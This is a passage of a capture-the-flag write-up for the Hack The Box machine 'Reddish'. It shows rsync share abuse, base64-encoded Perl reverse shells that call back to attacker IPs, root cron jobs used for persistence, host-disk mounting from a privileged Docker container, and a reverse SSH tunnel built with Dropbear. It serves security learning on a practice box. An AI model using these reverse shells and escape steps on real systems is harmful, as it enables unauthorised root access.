<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># rsync rsync://backup:873/src</span></span><br><span class="line">drwxr-xr-x          4,096 2018/07/15 17:42:39 .</span><br><span class="line">-rwxr-xr-x              0 2018/05/04 21:01:30 .dockerenv</span><br><span class="line">-rwxr-xr-x            100 2018/05/04 19:55:07 docker-entrypoint.sh</span><br><span class="line">drwxr-xr-x          4,096 2018/07/15 17:42:41 backup</span><br><span class="line">drwxr-xr-x          4,096 2018/07/15 17:42:39 bin</span><br><span class="line">drwxr-xr-x          4,096 2018/07/15 17:42:38 boot</span><br><span class="line">drwxr-xr-x          4,096 2018/07/15 17:42:39 data</span><br><span class="line">drwxr-xr-x          3,720 2020/07/25 14:50:42 dev</span><br><span class="line">drwxr-xr-x          4,096 2018/07/15 17:42:39 etc</span><br><span class="line">drwxr-xr-x          4,096 2018/07/15 17:42:38 home</span><br><span class="line">drwxr-xr-x          4,096 2018/07/15 17:42:39 lib</span><br><span class="line">drwxr-xr-x          4,096 2018/07/15 17:42:38 lib64</span><br><span class="line">drwxr-xr-x          4,096 2018/07/15 17:42:38 media</span><br><span class="line">drwxr-xr-x          4,096 2018/07/15 17:42:38 mnt</span><br><span class="line">drwxr-xr-x          4,096 2018/07/15 17:42:38 opt</span><br><span class="line">dr-xr-xr-x              0 2020/07/25 14:50:42 proc</span><br><span class="line">drwxr-xr-x          4,096 2020/07/25 20:16:01 rdb</span><br><span class="line">drwx------          4,096 2018/07/15 17:42:38 root</span><br><span class="line">drwxr-xr-x          4,096 2020/07/25 14:50:43 run</span><br><span class="line">drwxr-xr-x          4,096 2018/07/15 17:42:38 sbin</span><br><span class="line">drwxr-xr-x          4,096 2018/07/15 17:42:38 srv</span><br><span class="line">dr-xr-xr-x              0 2020/07/25 14:50:42 sys</span><br><span class="line">drwxrwxrwt          4,096 2020/07/25 21:18:01 tmp</span><br><span class="line">drwxr-xr-x          4,096 2018/07/15 17:42:39 usr</span><br><span class="line">drwxr-xr-x          4,096 2018/07/15 17:42:39 var</span><br></pre></td></tr></table></figure>

<p>I can write to the file system:</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># rsync rsync://backup:873/src/tmp/</span></span><br><span class="line">drwxrwxrwt          4,096 2018/07/26 21:27:16 .</span><br><span class="line"><span class="comment"># rsync luci rsync://backup:873/src/tmp/</span></span><br><span class="line"><span class="comment"># rsync rsync://backup:873/src/tmp/</span></span><br><span class="line">drwxrwxrwt          4,096 2018/07/26 21:27:34 .</span><br><span class="line">-rw-r--r--              0 2018/07/26 21:27:34 luci</span><br></pre></td></tr></table></figure>

<h3 id="Shell-via-Cron"><a href="#Shell-via-Cron" class="headerlink" title="Shell via Cron"></a>Shell via Cron</h3><p>I’ll use the read / write access to verify that cron is enabled, and then write one to get shell.<br>There’s already a cron named clean in the folder, which is a good sign that cron is enabled:</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># rsync rsync://backup:873/src/etc/cron.d/</span></span><br><span class="line">drwxr-xr-x          4,096 2018/07/25 21:41:13 .</span><br><span class="line">-rw-r--r--            102 2015/06/11 10:23:47 .placeholder</span><br><span class="line">-rw-r--r--             29 2018/05/04 20:57:55 clean</span><br></pre></td></tr></table></figure>

<p>I’ll write a cron file. First, a shell script that calls back to www on port 9010:</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># echo cGVybCAtZSAndXNlIFNvY2tldDskaT0iMTcyLjIwLjAuMiI7JHA9OTAxMDtzb2NrZXQoUyxQRl9JTkVULFNPQ0tfU1RSRUFNLGdldHByb3RvYnluYW1lKCJ0Y3AiKSk7aWYoY29ubmVjdChTLHNvY2thZGRyX2luKCRwLGluZXRfYXRvbigkaSkpKSl7b3BlbihTVERJTiwiPiZTIik7b3BlbihTVERPVVQsIj4mUyIpO29wZW4oU1RERVJSLCI+JlMiKTtleGVjKCIvYmluL3NoIC1pIik7fTsnCg== | base64 -d &gt; shell.sh</span></span><br><span class="line"><span class="comment"># cat shell.sh</span></span><br><span class="line">perl -e <span class="string">&#x27;use Socket;$i=&quot;172.20.0.2&quot;;$p=9010;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&quot;tcp&quot;));if(connect(S,sockaddr_in($p,inet_aton($i))))&#123;open(STDIN,&quot;&gt;&amp;S&quot;);open(STDOUT,&quot;&gt;&amp;S&quot;);open(STDERR,&quot;&gt;&amp;S&quot;);exec(&quot;/bin/sh -i&quot;);&#125;;&#x27;</span></span><br><span class="line"><span class="comment"># rsync -a shell.sh rsync://backup:873/src/tmp/</span></span><br><span class="line"><span class="comment"># rsync rsync://backup:873/src/tmp/</span></span><br><span class="line">drwxrwxrwt          4,096 2020/07/25 21:33:31 .</span><br><span class="line">-rw-r--r--              0 2020/07/25 21:24:23 luci</span><br><span class="line">-rw-r--r--            220 2020/07/25 21:33:08 shell.sh</span><br></pre></td></tr></table></figure>

<p>Now write the cron:</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># echo &#x27;* * * * * root sh /tmp/shell.sh&#x27; &gt; shell</span></span><br><span class="line"><span class="comment"># rsync -a shell rsync://backup:873/src/etc/cron.d/</span></span><br></pre></td></tr></table></figure>

<p>Rather than tunnel everything thing back to kali, I’ll just use socat to listen on www in this case. That gets me a callback as root on backup:</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># /socat TCP-LISTEN:9010 STDOUT</span></span><br><span class="line">/bin/sh: 0: can<span class="string">&#x27;t access tty; job control turned off</span></span><br><span class="line"><span class="string"># id</span></span><br><span class="line"><span class="string">uid=0(root) gid=0(root) groups=0(root)</span></span><br><span class="line"><span class="string"># whoami</span></span><br><span class="line"><span class="string">root</span></span><br><span class="line"><span class="string"># hostname</span></span><br><span class="line"><span class="string">backup</span></span><br></pre></td></tr></table></figure>

<h2 id="reddish-Host"><a href="#reddish-Host" class="headerlink" title="reddish Host"></a>reddish Host</h2><h3 id="File-System-Access"><a href="#File-System-Access" class="headerlink" title="File System Access"></a>File System Access</h3><p>backup is rather bare, other than the information I already had. However, one of the mis-configurations that can come with docker is running with –privileged. There’s some detail on slide 20 <span class="exturl" data-url="aHR0cHM6Ly93d3cuc2xpZGVzaGFyZS5uZXQvQm9yZ0hhbi9oYWNraW5nLWRvY2tlci10aGUtZWFzeS13YXk=">here<i class="fa fa-external-link-alt"></i></span>. That flag provides access to the raw devices in /dev on the host.</p>
<p>on backup, I see a lot more, including the disks:</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># ls /dev</span></span><br><span class="line">...</span><br><span class="line">psaux</span><br><span class="line">ptmx</span><br><span class="line">pts</span><br><span class="line">random</span><br><span class="line">rfkill</span><br><span class="line">rtc0</span><br><span class="line">sda</span><br><span class="line">sda1</span><br><span class="line">sda2</span><br><span class="line">sda3</span><br><span class="line">sda4</span><br><span class="line">sda5</span><br><span class="line">sg0</span><br><span class="line">sg1</span><br><span class="line">shm</span><br><span class="line">snapshot</span><br><span class="line">snd</span><br><span class="line">sr0</span><br><span class="line">stderr</span><br><span class="line">stdin</span><br><span class="line">stdout</span><br><span class="line">...</span><br></pre></td></tr></table></figure>

<p>This raw device access is enough to provide file system access:</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># mount /dev/sda1 /mnt</span></span><br><span class="line"><span class="comment"># ls /mnt/root</span></span><br><span class="line">root.txt</span><br></pre></td></tr></table></figure>

<p>grab the flag:</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># cat /mnt/root/root.txt</span></span><br><span class="line">50d0db644c8d5ff5312ef3d17c2ed205</span><br></pre></td></tr></table></figure>

<ul>
<li><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb56.jpg"></li>
</ul>
<h3 id="root-Shell"><a href="#root-Shell" class="headerlink" title="root Shell"></a>root Shell</h3><p>With write access to /etc/cron.d, I can get a root shell easily. And, reddish can talk directly home, so I don’t have to make tunnels, which is nice. Write a shell script:</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># echo cGVybCAtZSAndXNlIFNvY2tldDskaT0iMTAuMTAuMTQuOSI7JHA9OTAxMDtzb2NrZXQoUyxQRl9JTkVULFNPQ0tfU1RSRUFNLGdldHByb3RvYnluYW1lKCJ0Y3AiKSk7aWYoY29ubmVjdChTLHNvY2thZGRyX2luKCRwLGluZXRfYXRvbigkaSkpKSl7b3BlbihTVERJTiwiPiZTIik7b3BlbihTVERPVVQsIj4mUyIpO29wZW4oU1RERVJSLCI+JlMiKTtleGVjKCIvYmluL3NoIC1pIik7fTsnCg== | base64 -d &gt; shell.sh</span></span><br><span class="line"><span class="comment"># cat /mnt/opt/shell.sh</span></span><br><span class="line">perl -e <span class="string">&#x27;use Socket;$i=&quot;10.10.14.9&quot;;$p=9010;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&quot;tcp&quot;));if(connect(S,sockaddr_in($p,inet_aton($i))))&#123;open(STDIN,&quot;&gt;&amp;S&quot;);open(STDOUT,&quot;&gt;&amp;S&quot;);open(STDERR,&quot;&gt;&amp;S&quot;);exec(&quot;/bin/sh -i&quot;);&#125;;&#x27;</span></span><br></pre></td></tr></table></figure>

<p>Now write the cron:</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># cd /mnt/etc/cron.d/</span></span><br><span class="line"><span class="comment"># echo &#x27;* * * * * root sh /opt/shell.sh&#x27; &gt; shell</span></span><br><span class="line"><span class="comment"># ls</span></span><br><span class="line">mdadm</span><br><span class="line">popularity-contest</span><br><span class="line">shell</span><br></pre></td></tr></table></figure>

<p>Catch the callback:</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># nc -lvp 9010</span></span><br><span class="line">Ncat: Version 7.80 ( https://nmap.org/ncat )</span><br><span class="line">Ncat: Listening on :::9010</span><br><span class="line">Ncat: Listening on 0.0.0.0:9010</span><br><span class="line">Ncat: Connection from 10.10.10.94.</span><br><span class="line">Ncat: Connection from 10.10.10.94:35526.</span><br><span class="line">/bin/sh: 0: can<span class="string">&#x27;t access tty; job control turned off</span></span><br><span class="line"><span class="string"># id</span></span><br><span class="line"><span class="string">uid=0(root) gid=0(root) groups=0(root)</span></span><br><span class="line"><span class="string"># whoami</span></span><br><span class="line"><span class="string">root</span></span><br><span class="line"><span class="string"># ls</span></span><br><span class="line"><span class="string">root.txt</span></span><br><span class="line"><span class="string"># ifconfig</span></span><br><span class="line"><span class="string">/bin/sh: 4: ifconfig: not found</span></span><br><span class="line"><span class="string"># ip addr</span></span><br><span class="line"><span class="string">1: lo: &lt;LOOPBACK,UP,LOWER_UP&gt; mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1</span></span><br><span class="line"><span class="string">    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00</span></span><br><span class="line"><span class="string">    inet 127.0.0.1/8 scope host lo</span></span><br><span class="line"><span class="string">       valid_lft forever preferred_lft forever</span></span><br><span class="line"><span class="string">2: ens33: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc pfifo_fast state UP group default qlen 1000</span></span><br><span class="line"><span class="string">    link/ether 00:50:56:b9:ef:a7 brd ff:ff:ff:ff:ff:ff</span></span><br><span class="line"><span class="string">    inet 10.10.10.94/24 brd 10.10.10.255 scope global ens33</span></span><br><span class="line"><span class="string">       valid_lft forever preferred_lft forever</span></span><br><span class="line"><span class="string">3: br-81dc9e600be9: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc noqueue state UP group default </span></span><br><span class="line"><span class="string">    link/ether 02:42:fe:5f:02:1f brd ff:ff:ff:ff:ff:ff</span></span><br><span class="line"><span class="string">    inet 172.18.0.1/16 brd 172.18.255.255 scope global br-81dc9e600be9</span></span><br><span class="line"><span class="string">       valid_lft forever preferred_lft forever</span></span><br><span class="line"><span class="string">4: br-91c5803ee070: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc noqueue state UP group default </span></span><br><span class="line"><span class="string">    link/ether 02:42:7e:9a:4c:f3 brd ff:ff:ff:ff:ff:ff</span></span><br><span class="line"><span class="string">    inet 172.20.0.1/16 brd 172.20.255.255 scope global br-91c5803ee070</span></span><br><span class="line"><span class="string">       valid_lft forever preferred_lft forever</span></span><br><span class="line"><span class="string">5: br-d4a52cd704d0: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc noqueue state UP group default </span></span><br><span class="line"><span class="string">    link/ether 02:42:71:03:1d:13 brd ff:ff:ff:ff:ff:ff</span></span><br><span class="line"><span class="string">    inet 172.19.0.1/16 brd 172.19.255.255 scope global br-d4a52cd704d0</span></span><br><span class="line"><span class="string">       valid_lft forever preferred_lft forever</span></span><br><span class="line"><span class="string">6: docker0: &lt;NO-CARRIER,BROADCAST,MULTICAST,UP&gt; mtu 1500 qdisc noqueue state DOWN group default </span></span><br><span class="line"><span class="string">    link/ether 02:42:47:f2:fd:fd brd ff:ff:ff:ff:ff:ff</span></span><br><span class="line"><span class="string">    inet 172.17.0.1/16 brd 172.17.255.255 scope global docker0</span></span><br><span class="line"><span class="string">       valid_lft forever preferred_lft forever</span></span><br><span class="line"><span class="string">8: vethff25d9b@if7: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc noqueue master br-d4a52cd704d0 state UP group default </span></span><br><span class="line"><span class="string">    link/ether 5e:d0:0b:6f:0d:6f brd ff:ff:ff:ff:ff:ff link-netnsid 3</span></span><br><span class="line"><span class="string">10: veth2f1092e@if9: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc noqueue master br-81dc9e600be9 state UP group default </span></span><br><span class="line"><span class="string">    link/ether 6a:7e:bc:f7:0d:2e brd ff:ff:ff:ff:ff:ff link-netnsid 3</span></span><br><span class="line"><span class="string">12: veth4ff04ec@if11: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc noqueue master br-d4a52cd704d0 state UP group default </span></span><br><span class="line"><span class="string">    link/ether 32:d6:19:ae:75:e5 brd ff:ff:ff:ff:ff:ff link-netnsid 0</span></span><br><span class="line"><span class="string">14: veth2349c18@if13: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc noqueue master br-91c5803ee070 state UP group default </span></span><br><span class="line"><span class="string">    link/ether 06:9f:60:e4:c1:cd brd ff:ff:ff:ff:ff:ff link-netnsid 0</span></span><br><span class="line"><span class="string">16: veth3bff539@if15: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc noqueue master br-91c5803ee070 state UP group default </span></span><br><span class="line"><span class="string">    link/ether 9a:c4:04:69:cd:5a brd ff:ff:ff:ff:ff:ff link-netnsid 2</span></span><br><span class="line"><span class="string">18: veth01eea77@if17: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc noqueue master br-d4a52cd704d0 state UP group default </span></span><br><span class="line"><span class="string">    link/ether d2:d8:e2:80:45:09 brd ff:ff:ff:ff:ff:ff link-netnsid 1</span></span><br><span class="line"><span class="string">19: virbr0: &lt;NO-CARRIER,BROADCAST,MULTICAST,UP&gt; mtu 1500 qdisc noqueue state DOWN group default qlen 1000</span></span><br><span class="line"><span class="string">    link/ether 52:54:00:a8:fd:d5 brd ff:ff:ff:ff:ff:ff</span></span><br><span class="line"><span class="string">    inet 192.168.122.1/24 brd 192.168.122.255 scope global virbr0</span></span><br><span class="line"><span class="string">       valid_lft forever preferred_lft forever</span></span><br><span class="line"><span class="string">20: virbr0-nic: &lt;BROADCAST,MULTICAST&gt; mtu 1500 qdisc pfifo_fast master virbr0 state DOWN group default qlen 1000</span></span><br><span class="line"><span class="string">    link/ether 52:54:00:a8:fd:d5 brd ff:ff:ff:ff:ff:ff</span></span><br></pre></td></tr></table></figure>

<p>what a great and complicated box!</p>
<h2 id="Beyond-Root"><a href="#Beyond-Root" class="headerlink" title="Beyond Root"></a>Beyond Root</h2><h3 id="Docker-Configuration"><a href="#Docker-Configuration" class="headerlink" title="Docker Configuration"></a>Docker Configuration</h3><p>Once I have root, I like to go back and look at how things were configured. In this case, the docker configuration is interesting.</p>
<p>The docker configuration files are stored in /opt/reddish_composition/:</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># cd /opt/reddish_composition/</span></span><br><span class="line"><span class="comment"># ls</span></span><br><span class="line">apache</span><br><span class="line">docker-compose.yml</span><br><span class="line">multi-nodered</span><br><span class="line">redis</span><br><span class="line">rsync</span><br><span class="line">www</span><br></pre></td></tr></table></figure>

<p>docker-compose.yml shows how the machines are run, including the shared volume between redis and www, how the networks are laid out, and that backup is running in privileged mode (&lt;– comments added by me):</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># cat docker-compose.yml</span></span><br><span class="line">version: <span class="string">&#x27;3&#x27;</span></span><br><span class="line">services:</span><br><span class="line">  nodered:</span><br><span class="line">    build: ./multi-nodered</span><br><span class="line">    hostname: nodered</span><br><span class="line">    ports:</span><br><span class="line">     - <span class="string">&quot;1880:1880&quot;</span></span><br><span class="line">    networks:</span><br><span class="line">      - default</span><br><span class="line">      - internal-network</span><br><span class="line">    restart: always</span><br><span class="line">  redis:</span><br><span class="line">    build: ./redis</span><br><span class="line">    hostname: redis</span><br><span class="line">    volumes:</span><br><span class="line">     - ./www:/var/www/html</span><br><span class="line">    networks:</span><br><span class="line">     - internal-network</span><br><span class="line">    restart: always</span><br><span class="line">  www:</span><br><span class="line">    build: ./apache</span><br><span class="line">    hostname: www</span><br><span class="line">    volumes:</span><br><span class="line">     - ./www:/var/www/html</span><br><span class="line">     - /home:/home</span><br><span class="line">    networks:</span><br><span class="line">     - internal-network</span><br><span class="line">     - internal-network-2</span><br><span class="line">    restart: always</span><br><span class="line">  backup:</span><br><span class="line">    build: ./rsync</span><br><span class="line">    hostname: backup</span><br><span class="line">    volumes:</span><br><span class="line">     - ./rsync/www:/backup</span><br><span class="line">    networks:</span><br><span class="line">     - internal-network-2</span><br><span class="line">    restart: always</span><br><span class="line">    privileged: <span class="literal">true</span></span><br><span class="line">networks:</span><br><span class="line">  internal-network:</span><br><span class="line">   internal: <span class="literal">true</span></span><br><span class="line">  internal-network-2:</span><br><span class="line">   internal: <span class="literal">true</span></span><br></pre></td></tr></table></figure>

<p>update picture of the docker network one last time:</p>
<ul>
<li><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb57.jpg"></li>
</ul>
<h3 id="Node-Red-Collisions"><a href="#Node-Red-Collisions" class="headerlink" title="Node-Red Collisions"></a>Node-Red Collisions</h3><p>When I first visit the node red site, what’s to keep me from running into other people and their flows? And, what was with the need to issue a POST request to get the url to the site? Turns out, those are related.</p>
<p>The code that’s running the NodeRed instance is in /node-red/multinodered.js:</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># cat /opt/reddish_composition/multi-nodered/nodered/multinodered.js</span></span><br><span class="line">var http = require(<span class="string">&#x27;http&#x27;</span>);</span><br><span class="line">var express = require(<span class="string">&quot;express&quot;</span>);</span><br><span class="line">var crypto = require(<span class="string">&quot;crypto&quot;</span>);</span><br><span class="line"></span><br><span class="line">var id_list = [];</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> createNodeREDInstance(server, app, ip) &#123;</span><br><span class="line"></span><br><span class="line">    var id = crypto.createHash(<span class="string">&#x27;md5&#x27;</span>).update(ip).digest(<span class="string">&quot;hex&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (id_list.indexOf(id) &gt; -1) &#123;</span><br><span class="line">        console.log(<span class="string">&quot;Instance already running:&quot;</span>, id);</span><br><span class="line">        <span class="built_in">return</span> id;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    var RED = require(<span class="string">&quot;./red/red.js&quot;</span>)();</span><br><span class="line">    //var id = crypto.randomBytes(16).toString(<span class="string">&#x27;hex&#x27;</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    console.log(<span class="string">&quot;Creating new instance:&quot;</span>, id);</span><br><span class="line"></span><br><span class="line">    // Create the settings object - see default settings.js file <span class="keyword">for</span> other options</span><br><span class="line">    var settings = &#123;</span><br><span class="line">        httpAdminRoot:<span class="string">&quot;/red/&quot;</span>+id,</span><br><span class="line">        httpNodeRoot: <span class="string">&quot;/api/&quot;</span>+id,</span><br><span class="line">        userDir:<span class="string">&quot;./home/&quot;</span>+id,</span><br><span class="line">        functionGlobalContext: &#123; &#125;    // enables global context</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    RED.init(server, settings);</span><br><span class="line"></span><br><span class="line">    // Serve the editor UI from /red</span><br><span class="line">    app.use(settings.httpAdminRoot, RED.httpAdmin);</span><br><span class="line"></span><br><span class="line">    // Serve the http nodes UI from /api</span><br><span class="line">    app.use(settings.httpNodeRoot, RED.httpNode);</span><br><span class="line"></span><br><span class="line">    RED.start();</span><br><span class="line"></span><br><span class="line">    id_list.push(id);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">return</span> id;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// Create an Express app</span><br><span class="line">var app = express();</span><br><span class="line"></span><br><span class="line">// Add a simple route <span class="keyword">for</span> static content served from <span class="string">&#x27;public&#x27;</span></span><br><span class="line">app.use(<span class="string">&quot;/&quot;</span>,express.static(<span class="string">&quot;public&quot;</span>));</span><br><span class="line"></span><br><span class="line">app.post(<span class="string">&#x27;/&#x27;</span>, <span class="keyword">function</span>(req,res) &#123;</span><br><span class="line">    var ip = (req.headers[<span class="string">&#x27;x-forwarded-for&#x27;</span>] ||</span><br><span class="line">     req.connection.remoteAddress ||</span><br><span class="line">     req.socket.remoteAddress ||</span><br><span class="line">     req.connection.socket.remoteAddress).split(<span class="string">&quot;,&quot;</span>)[0];</span><br><span class="line"></span><br><span class="line">    var id = createNodeREDInstance(server, app, ip);</span><br><span class="line">    res.status(200).send(&#123;<span class="string">&quot;id&quot;</span>: id, <span class="string">&quot;ip&quot;</span>: ip, <span class="string">&#x27;path&#x27;</span>: <span class="string">&quot;/red/&#123;id&#125;&quot;</span>&#125;);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">// Create a server</span><br><span class="line">var server = http.createServer(app);</span><br><span class="line"></span><br><span class="line">server.listen(1880);</span><br></pre></td></tr></table></figure>

<p>There’s no GET for this app, which explains the error. A POST will create a new NodeRed instance and return the id, and the id is what’s sent back to us.</p>
<p>Inside the createNodeREDInstance() function I see the id is just a hash of our ip (which works out really nice when multiple HTB players are trying to use this at the same time):</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">var id = crypto.createHash(<span class="string">&#x27;md5&#x27;</span>).update(ip).digest(<span class="string">&quot;hex&quot;</span>);</span><br></pre></td></tr></table></figure>

<h2 id="Creating-Port-Forwards-with-Dropbear"><a href="#Creating-Port-Forwards-with-Dropbear" class="headerlink" title="Creating Port Forwards with Dropbear"></a>Creating Port Forwards with Dropbear</h2><h3 id="Setup"><a href="#Setup" class="headerlink" title="Setup"></a>Setup</h3><p>a dummy account on my kali box (named dummy). In /etc/passwd, the shell is set to /bin/false:</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">dummy:x:1001:1001::/home/dummy:/bin/<span class="literal">false</span></span><br></pre></td></tr></table></figure>

<p>That makes it much harder for someone who gets ahold of the key I’m about to create to do anything useful hacking into my host. If you try to ssh into box as dummy, it just closes:</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali<span class="comment"># ssh dummy@localhost</span></span><br><span class="line">dummy@localhost<span class="string">&#x27;s password: </span></span><br><span class="line"><span class="string">Linux kali 4.18.0-kali3-amd64 #1 SMP Debian 4.18.20-2kali2 (2018-11-30) x86_64</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">The programs included with the Kali GNU/Linux system are free software;</span></span><br><span class="line"><span class="string">the exact distribution terms for each program are described in the</span></span><br><span class="line"><span class="string">individual files in /usr/share/doc/*/copyright.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Kali GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent</span></span><br><span class="line"><span class="string">permitted by applicable law.</span></span><br><span class="line"><span class="string">Last login: Thu Jan 17 06:28:18 2019 from 127.0.0.1</span></span><br><span class="line"><span class="string">Connection to localhost closed.</span></span><br></pre></td></tr></table></figure>

<p>use the -N flag to connect without a shell, and the -L, -R, -D flags to forward ports (check out <span class="exturl" data-url="aHR0cHM6Ly8weGRmLmdpdGxhYi5pby8yMDE4LzA2LzEwL2ludHJvLXRvLXNzaC10dW5uZWxpbmcuaHRtbA==">Intro to SSH Tunneling<i class="fa fa-external-link-alt"></i></span> for more details).</p>
<h3 id="Build-Dropbear"><a href="#Build-Dropbear" class="headerlink" title="Build Dropbear"></a>Build Dropbear</h3><p><span class="exturl" data-url="aHR0cHM6Ly9tYXR0LnVjYy5hc24uYXUvZHJvcGJlYXIvZHJvcGJlYXIuaHRtbA==">Dropbear<i class="fa fa-external-link-alt"></i></span> is a statically compiled, relatively small ssh client that I will use to connect back to my kali box from nodered. I’ll grab the source from the website. I’ll copy the file to nodered using the file upload flow or the perl command to get a file over http:</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># perl -e &#x27;use File::Fetch; my $url = &quot;http://10.10.14.9/dropbear-2018.76.tar.bz2&quot;; my $ff = File::Fetch-&gt;new(uri =&gt; $url); my $file = $ff-&gt;fetch() or die $ff-&gt;error;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># pwd</span></span><br><span class="line">/tmp</span><br><span class="line"></span><br><span class="line"><span class="comment"># ls</span></span><br><span class="line">dropbear-2018.76.tar.bz2</span><br></pre></td></tr></table></figure>

<p>Open the archive with tar:</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># tar xjvf dropbear-2018.76.tar.bz2                                                      </span></span><br><span class="line">dropbear-2018.76/                                                                        </span><br><span class="line">dropbear-2018.76/termcodes.h                                                  </span><br><span class="line">dropbear-2018.76/dbmulti.c                                                                </span><br><span class="line">dropbear-2018.76/cli-runopts.c  </span><br><span class="line">...[snip]...</span><br></pre></td></tr></table></figure>

<p>Now compile the software (the container has gcc and the minimum libraries to build this):</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># cd dropbear-2018.76/                     </span></span><br><span class="line"><span class="comment"># ./configure &amp;&amp; make                  </span></span><br><span class="line">checking <span class="keyword">for</span> gcc... gcc                      </span><br><span class="line">checking whether the C compiler works... yes</span><br><span class="line">checking <span class="keyword">for</span> C compiler default output file name... a.out</span><br><span class="line">checking <span class="keyword">for</span> suffix of executables...    </span><br><span class="line">checking whether we are cross compiling... no</span><br><span class="line">...[snip]...</span><br></pre></td></tr></table></figure>

<h3 id="Generate-Key-Pair"><a href="#Generate-Key-Pair" class="headerlink" title="Generate Key Pair"></a>Generate Key Pair</h3><p>Next generate a key pair to use with dropbearkey. It’s a simple program with <span class="exturl" data-url="aHR0cHM6Ly9saW51eC5kaWUubmV0L21hbi84L2Ryb3BiZWFya2V5">only a few options<i class="fa fa-external-link-alt"></i></span>. use -t rsa to make an RSA keypair, and -f .k to name the key file .k:</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># ./dropbearkey -t rsa -f .k</span></span><br><span class="line">Generating 2048 bit rsa key, this may take a <span class="keyword">while</span>...</span><br><span class="line">Public key portion is:</span><br><span class="line">ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCFI9K2O4PVLSLLIJw2ExqYHtPUQTrcn+GKR3BRaD8Th+5CYIPMRQF8MK29tlgjdZh5MSf5RB4tsm523hMp6879tvi0Bzc0afZ8FKfaVjTwWsG/cbNFZzi4W5PpwsLkh9vbBgXhbPfdmMdz2uLZrsmPKVKXXkg/URz9vhiQelJAL0PcysIBh3c9CkJfNzzNJ2DHxY/OugnhQlObmLfOzkucP2DtTAZjYYCpc8cByzKS7vgo8rZLscf7QrN3LLKr8SFmjSnEcqxvIC1cVOpRju3kmfJxNY4ebcod1DaQtRYXC+K2byNwf5y3z3ahhW8dWJVLEcPH0bueuRVnYk3wfrjx root@nodered</span><br><span class="line">Fingerprint: sha1!! 78:53:6e:77:d8:da:ef:43:a7:c8:97:de:3c:a0:c4:d4:80:7d:f3:ab</span><br></pre></td></tr></table></figure>

<p>Now put this public key into the authorized key file for dummy on my kali box. While this key is in that file, anyone who has the private key (.k) can ssh into my box, so I’ll want to leave this in place only long enough to get the tunnels set up.</p>
<h3 id="Create-Tunnel"><a href="#Create-Tunnel" class="headerlink" title="Create Tunnel"></a>Create Tunnel</h3><p>Now use DropBear’s dbclient to ssh back, creating a tunnel to access the web page on www:</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># ./dbclient -i .k -f -N -R 8888:172.19.0.4:80 dummy@10.10.14.9</span></span><br></pre></td></tr></table></figure>

<p>The options used are:</p>
<ul>
<li>-i .k - Use the keyfile I generated earlier</li>
<li>-f - run ssh in the background</li>
<li>-N - Done request a shell or run and commands</li>
<li>-R 8888:172.19.0.4:80 - listen on port 8888 on my kali host, and forward and traffic to 172.19.0.4 port 80. It’s important to note that my dummy user doesn’t have the privilege necessary to listen on a low port, like 80.</li>
</ul>
<p>Now can access the website on www:</p>
<ul>
